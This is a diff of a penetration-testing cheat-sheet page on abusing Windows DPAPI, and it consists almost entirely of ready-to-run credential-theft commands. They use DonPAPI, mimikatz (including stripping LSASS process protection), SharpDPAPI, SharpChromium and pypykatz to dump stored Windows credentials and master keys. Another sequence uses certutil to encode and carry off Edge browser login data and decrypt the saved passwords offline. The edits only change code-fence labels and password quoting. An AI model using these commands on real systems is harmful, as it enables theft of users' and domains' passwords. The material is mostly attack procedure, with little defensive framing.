@@ -4,7 +4,6 @@ date: 2024-7-31
 tags: ["DPAPI", "enum", "Windows", "password", "credentials", "DonPAPI"]
 ---
 
----
 ### Abuse #1: Auto dump (From Linux)
 
 {{< tab set1 tab1 active >}}Linux{{< /tab >}}
@@ -12,8 +11,8 @@ tags: ["DPAPI", "enum", "Windows", "password", "credentials", "DonPAPI"]
 
 <div>
 
-```bash
-DonPAPI collect -d <DOMAIN> -u <USERNAME> -p <PASSWORD> -t <TARGET>
+```console
+DonPAPI collect -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' -t <TARGET>
 ```
 
 <small>*Ref: [DonPAPI](https://github.com/login-securite/DonPAPI)*</small>
@@ -32,7 +31,7 @@ DonPAPI collect -d <DOMAIN> -u <USERNAME> -p <PASSWORD> -t <TARGET>
 
 <div>
 
-```powershell
+```console
 cmd /c "dir /S /AS C:\Users\<TARGET_UESR>\AppData\Local\Microsoft\Vault & dir /S /AS C:\Users\<TARGET_UESR>\AppData\Local\Microsoft\Credentials & dir /S /AS C:\Users\<TARGET_UESR>\AppData\Local\Microsoft\Protect & dir /S /AS C:\Users\<TARGET_UESR>\AppData\Roaming\Microsoft\Vault & dir /S /AS C:\Users\<TARGET_UESR>\AppData\Roaming\Microsoft\Credentials & dir /S /AS C:\Users\<TARGET_UESR>\AppData\Roaming\Microsoft\Protect"
 ```
 
@@ -42,7 +41,7 @@ cmd /c "dir /S /AS C:\Users\<TARGET_UESR>\AppData\Local\Microsoft\Vault & dir /S
 
 <div>
 
-```powershell
+```console
 mimikatz.exe "token::elevate" "!+" "!processprotect /process:lsass.exe /remove" "dpapi::cred /in:C:\Users\<TARGET_UESR>\AppData\Roaming\Microsoft\Credentials\<CREDENTIALS_HASH>"' '"dpapi::masterkey /in:C:\Users\<TARGET_UESR>\AppData\Roaming\Microsoft\Protect\<SID>\<PROTECT_HASH> /sid:<SID> /password:<PASSWORD> /protected"' '"dpapi::cred /in:C:\Users\<TARGET_UESR>\AppData\Roaming\Microsoft\Credentials\<CREDENTIALS_HASH>"' "exit"
 ```
 
@@ -53,14 +52,14 @@ mimikatz.exe "token::elevate" "!+" "!processprotect /process:lsass.exe /remove" 
 
 <div>
 
-```bash
+```console
 # Run as system
 .\SharpDPAPI.exe machinetriage
 ```
 
-```bash
+```console
 # Run as user
-.\SharpDPAPI.exe credentials /password:<PASSWORD>
+.\SharpDPAPI.exe credentials /password:'<PASSWORD>'
 ```
 
 </div>
@@ -79,7 +78,7 @@ mimikatz.exe "token::elevate" "!+" "!processprotect /process:lsass.exe /remove" 
 
 <div>
 
-```powershell
+```console
 .\SharpChromium.exe logins
 ```
 
@@ -94,27 +93,27 @@ mimikatz.exe "token::elevate" "!+" "!processprotect /process:lsass.exe /remove" 
 
 <div>
 
-```powershell
+```console
 # Get Local State json file, copy and paste to local Linux
 type "C:\Users\<USER>\appdata\local\microsoft\edge\User Data\Local State"
 ```
 
-```powershell
+```console
 # Get Login Data binary file
 certutil -encode "C:\Users\<USER>\appdata\local\microsoft\edge\User Data\Default\Login Data" C:\ProgramData\logindata
 ```
 
-```powershell
+```console
 # Copy and paste to local Linux
 type C:\ProgramData\logindata
 ```
 
-```bash
+```console
 # Base64 decode
 cat logindata_b64 | base64 -d > logindata
 ```
 
-```bash
+```console
 # Extract key from local state
 cat localstate | jq -r .os_crypt.encrypted_key | base64 -d | cut -c6- > blob
 ```
@@ -123,7 +122,7 @@ cat localstate | jq -r .os_crypt.encrypted_key | base64 -d | cut -c6- > blob
 
 <div>
 
-```bash
+```console
 # Get masterkey_guid
 pypykatz dpapi describe blob blob
 ```
@@ -136,17 +135,17 @@ pypykatz dpapi describe blob blob
 
 <div>
 
-```powershell
+```console
 # Get master key
 certutil -encode "C:\Users\<USER>\AppData\Roaming\Microsoft\Protect\<SID>\<MASTERKEY_GUID>" C:\ProgramData\<MASTERKEY_GUID>
 ```
 
-```powershell
+```console
 # Copy and paste to local Linux
 type C:\ProgramData\<MASTERKEY_GUID>
 ```
 
-```bash
+```console
 # Base64 decode
 cat masterkey_guid_b64 | base64 -d > masterkey_guid
 ```
@@ -157,15 +156,15 @@ cat masterkey_guid_b64 | base64 -d > masterkey_guid
 
 <div>
 
-```bash
+```console
 pypykatz dpapi prekey password <SID> <USER_PASSWORD> | tee pkf
 ```
 
-```bash
+```console
 pypykatz dpapi masterkey <MASTERKEY_GUID_FILE> pkf -o mkf
 ```
 
-```bash
+```console
 pypykatz dpapi chrome --logindata logindata mkf localstate
 ```
 
@@ -184,12 +183,12 @@ pypykatz dpapi chrome --logindata logindata mkf localstate
 
 <div>
 
-```powershell
+```console
 # Take note: Last key
 .\mimikatz.exe "dpapi::masterkey /in:C:\users\<USER>\appdata\roaming\microsoft\protect\<SID>\<MASTERKEY_GUID> /rpc" exit
 ```
 
-```powershell
+```console
 # Decrypt
 .\mimikatz.exe "dpapi::cred /in:C:\users\<USER>\appdata\roaming\microsoft\protect\<SID>\<MASTERKEY_GUID> /masterkey:<KEY>" exit
 ```
